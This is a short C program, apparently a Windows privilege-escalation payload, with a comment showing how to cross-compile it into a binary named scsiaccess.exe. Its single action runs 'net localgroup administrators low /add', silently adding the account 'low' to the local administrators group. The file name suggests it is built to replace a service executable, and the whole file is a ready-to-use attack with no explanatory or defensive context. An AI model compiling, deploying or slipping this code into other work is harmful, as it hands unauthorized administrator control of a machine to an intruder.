#include <stdlib.h> /* system, NULL, EXIT_FAILURE  i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c  */
int main ()
{
int i;
i=system ("net localgroup administrators low /add");
return 0;
}
